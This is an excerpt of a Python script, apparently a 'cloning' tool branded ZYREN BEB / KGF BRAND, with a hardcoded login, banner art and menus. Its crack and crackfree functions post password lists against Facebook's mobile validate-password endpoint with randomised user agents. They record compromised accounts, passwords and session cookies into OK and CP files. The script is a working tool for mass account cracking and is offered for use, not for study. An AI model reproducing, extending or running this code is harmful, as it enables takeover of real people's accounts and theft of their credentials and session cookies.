...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/KGF BRAND.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
while attemps < 12345677901:
    ...
    if username == 'ZYREN' and password == 'BEB':
...
▣▞▚▞▚▞▚▞▚▞▚
   ...
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38mZYƦƏŊ Ɓěɓ]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • ZYREN BEB]  ║  \033[1;97m  
   ║    Github                   • \33[1;38mZYERN-EXE]  ║\33[1;34m   
...
os.system('espeak -a 300 " Welcome to ZYREN BEB cloning Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    KGFBRAND = input('\x1b[1;92m[+] CHOOSE: ')
    if KGFBRAND in ['111']:
        login()
        dump_massal()
    elif KGFBRAND in ['1']:
        crack_file()
    elif KGFBRAND in ['2','02']:
        os.system('xdg-open https://www.facebook.com/T3R199M9K0K9L0PU71M9M3R0L9D0H9LUMR9ND1K9BXH9K9M1K0')
        os.system("python nono.py")
    elif KGFBRAND in ['3','03']:
        result()
    elif KGFBRAND in ['0']:
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/KGF BRAND.khadka.587")
    if hc in ['1','01']:
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY KGF BRAND VAN Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[KANXA BAAPM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[KGF BRAND-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[KANXA BRAND-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " KANXA BRAND,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[ZYRRN-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ZYREN BEB-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ZYRRN BEB-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  ZYREN BEB,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
